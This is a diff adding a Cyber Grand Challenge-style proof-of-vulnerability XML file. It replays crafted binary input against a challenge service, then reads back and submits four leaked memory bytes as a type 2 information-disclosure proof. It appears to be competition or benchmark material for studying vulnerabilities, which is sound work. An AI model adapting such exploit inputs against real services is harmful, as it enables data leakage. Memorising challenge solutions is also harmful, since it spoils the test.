@@ -1,0 +1,21 @@
+<?xml version="1.0" standalone="no" ?>
+<!DOCTYPE cfepov SYSTEM "/usr/share/cgc-docs/cfe-pov.dtd">
+<cfepov>
+<cbid>service</cbid>
+<replay>
+    <negotiate><type2 /></negotiate>
+    <write><data>PTTC3\x1f\x3d\x81\x8f\xc8\xf7\x7f\x04\x00\x00\x00\x00\x00\x00\x00\x00\xc0GC\x00\x00\x00\x00</data></write>
+    <read><length>5</length><match><data>\xff\x04\x00\x00\x00</data></match></read>
+    <read><length>4</length><match><data>temp</data></match></read>
+    <read><length>4</length><match><data>\xef\xbe\xad\xde</data></match></read>
+    <write><data>temp\x99\xa5\xd7\xcc</data></write>
+    <read>
+       <length>4</length>
+       <assign>
+          <var>TYPE2_VALUE</var>
+          <slice />
+       </assign>
+    </read>
+    <submit><var>TYPE2_VALUE</var></submit>
+</replay>
+</cfepov>
